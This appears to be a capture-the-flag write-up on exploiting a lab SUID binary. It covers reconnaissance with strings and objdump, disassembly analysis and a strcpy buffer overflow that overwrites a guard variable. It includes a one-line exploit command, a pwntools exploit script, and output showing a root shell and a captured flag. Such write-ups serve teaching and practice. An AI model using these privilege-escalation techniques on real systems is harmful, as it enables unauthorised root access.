1. Initial Reconnaissance (Gathering Intelligence)Before looking at code, we must inspect the binary from the outside to understand its file properties, privileges, and embedded text assets.Step A: File Permissions and SUID Flags (ls -l)We begin by checking the file properties of the target binary:Bashls -l service
Why we do this: We look specifically to see if the binary has the SUID (Set Owner User ID) permission bit enabled (indicated by an s in the owner execute field, like -rwsr-xr-x). When an SUID binary owned by root is executed, it runs with full root privileges regardless of which low-privileged user launched it. This makes it a primary target for privilege escalation.Step B: Static String Analysis (strings)Next, we extract all plaintext, hardcoded strings embedded inside the compiled binary file:Bashstrings -t x service | grep 202b
Output:Plaintext202b 22222222
Why we do this: Developers frequently hardcode passwords, secret flags, or comparison strings directly inside executables. The -t x flag tells the utility to print the hexadecimal offset (the exact physical location in the file) where the string resides. Here, we discovered that the string "22222222" is hardcoded at offset 0x202b inside the binary's data section.2. Reverse Engineering & Source ReconstructionWith the initial clues collected, we perform static analysis on the binary's machine code using a disassembler to map out how it handles memory and makes logical decisions.Step A: Inspecting the Symbol TableWe inspect the binary's symbol table to identify compiled functions and external library calls:Bashobjdump -t service | grep F
This lists all executable functions. We see standard functions like main, alongside imported C standard library functions (strcpy@@GLIBC_2.2.5, strcmp@@GLIBC_2.2.5, and system@@GLIBC_2.2.5). The presence of system confirms the binary has the capability to run operating system shell commands.Step B: Disassembling the Main FunctionWe dump the assembly instructions for the core execution logic:Bashobjdump -d service | grep -A 100 "<main>:"
By reading this assembly line by line, we can piece together exactly what the developer wrote in C:1. Stack AllocationPlaintext4011fa:   push   %rbp
4011fb:   mov    %rsp,%rbp
4011ff:   sub    $0x478,%rsp
The program establishes its stack frame and reserves 0x478 bytes (1,144 bytes in decimal) of temporary local workspace in RAM.2. Initializing the Guard VariablePlaintext401213:   movabs $0x3131313131313131,%rax   ; "11111111"
40121d:   mov    %rax,-0x21(%rbp)           ; Save to stack
401221:   movb   $0x0,-0x19(%rbp)           ; Null-terminator
The program hardcodes an 8-byte ASCII string of 1s (0x31) into a local variable located at stack offset -0x21(%rbp). This is our Guard Variable.3. Vulnerable Input CapturePlaintext40127b:   lea    -0x70(%rbp),%rax           ; Target input buffer
401285:   callq  4010a0 <strcpy@plt>        ; Vulnerable copy function
If a command-line argument is supplied (argc == 2), the program locates a local buffer at offset -0x70(%rbp) and uses strcpy to copy the user input (argv[1]) directly into it.4. The Gatekeeper CheckPlaintext401331:   lea    -0x21(%rbp),%rax           ; Load Guard Variable
401335:   lea    0xcef(%rip),%rsi           ; Load string from 0x40202b ("22222222")
40133f:   callq  4010e0 <strcmp@plt>        ; Compare them
401344:   test   %eax,%eax
401346:   jne    401377 <main+0x181>        ; Exit if not equal
The program takes the string sitting at the Guard Variable's address (-0x21) and uses strcmp to check if it matches the secret reference string "22222222". If they do not match, the program jumps to the end and exits.5. Privilege Escalation BlockPlaintext401352:   callq  401100 <setuid@plt>        ; Drop privileges to UID 0 (root)
401361:   callq  4010f0 <setgid@plt>        ; Drop privileges to GID 0 (root)
401372:   callq  4010c0 <system@plt>        ; Execute terminal utility
If the comparison matches, execution falls straight into this block. The program elevates its effective IDs to root and spawns a system shell.3. Vulnerability Analysis & Math AlignmentThe structural flaw in this binary is a classic Stack-Based Buffer Overflow caused by the use of strcpy.The FlawThe strcpy function does not perform any boundary or length validation. It copies characters from the source string into the destination buffer sequentially until it encounters a null-terminator byte (\x00).Because the input buffer (-0x70) is situated lower down on the stack than our Guard Variable (-0x21), providing an input string larger than the buffer's allocation will cause the excess data to spill upward and overwrite adjacent memory.The Geometry CalculationTo corrupt the Guard Variable precisely without overshooting and crashing the program, we must calculate the exact physical byte distance between the start of the input buffer and the start of the Guard Variable:$$\text{Distance} = 0\text{x}70 - 0\text{x}21$$Converting these hexadecimal offsets to decimal values:$0\text{x}70 = 112\text{ bytes}$$0\text{x}21 = 33\text{ bytes}$$$112 - 33 = 79\text{ bytes}$$Payload ArchitectureOur input payload requires two distinct components:Padding (79 bytes): 79 arbitrary printable characters (like 'A') to completely fill the space from the buffer up to the exact edge of the Guard Variable.Target Override (8 bytes): The string "22222222", which lands squarely on top of the old "11111111" value.4. Exploitation (Two Approaches)Since the target string "22222222" consists entirely of printable, standard alphanumeric text, we do not need to deal with raw 64-bit memory addresses or execution-blocking null bytes (\x00). This allows us to exploit the application smoothly in two different ways.Approach 1: The Inline Command-Line Exploit (The Fast Way)We can generate our payload directly in the terminal using an inline Python command substituted into the program's argument vector:Bash./service $(python3 -c 'print("A" * 79 + "22222222")')
What happens under the hood:python3 -c prints exactly 79 'A' characters followed by eight '2' characters.The shell substitutes this output as argv[1] when executing ./service.strcpy maps the 79 'A's into the buffer space and writes "22222222" directly into the Guard Variable.The application prints its verification diagnostics, showing that the loop counted exactly 79 'A's and exactly 8 '2's.strcmp validates the modified guard variable, matches it against the reference asset, executes setuid(0), and hands back a root terminal prompt (#).Approach 2: Automated Exploit Script (The Scripted Way)For automated verification, stability tracking, and reliable interactions with the newly spawned shell, we use a Python script built around the pwntools framework.The Code (exploit.py):Pythonfrom pwn import *

# 1. Define the destination binary target
binary_path = "./service"

# 2. Architect the precise payload geometry
padding = b"A" * 79
target_value = b"22222222"
payload = padding + target_value

# 3. Spawn the local process, passing the payload as argv[1]
p = process([binary_path, payload])

# 4. Hand execution control over to the interactive terminal session
p.interactive()
Execution Output:Plaintextuser@host:~$ python3 exploit.py 
[+] Starting local process './service': pid 177
[*] Switching to interactive mode
Buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA22222222
2: 8
A: 79
$ id
uid=0(root) gid=0(root) groups=0(root),1000(user)
$ cat /root/flag.txt
your flag is 3199d9f19d5337bdec98edb2764695b0
Why It Worked PerfectlyInstead of trying to force code execution by hijacking the CPU's Instruction Pointer (%rip) via a return address overwrite—which requires careful alignment, pointer construction, and avoiding null-byte entry restrictions—this exploit takes advantage of a Variable Corruption attack vector.By strategically overriding an internal conditional variable state, we allowed the binary to safely navigate its own control loop and intentionally execute the privileged shell mechanics on our behalf.

more on here : https://0toroot.com/learn/linux-privesc/custom-suid-exploitation

https://hacktricks.wiki/en/binary-exploitation/stack-overflow/ret2win/index.html


user@794cdd4e22e34c1c8f4cd1581f197c0f-2377118072:~$ ./service $(python3 -c 'print("A" * 79 + "22222222")')

Buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA22222222
2: 8
A: 79
root@794cdd4e22e34c1c8f4cd1581f197c0f-2377118072:~# 
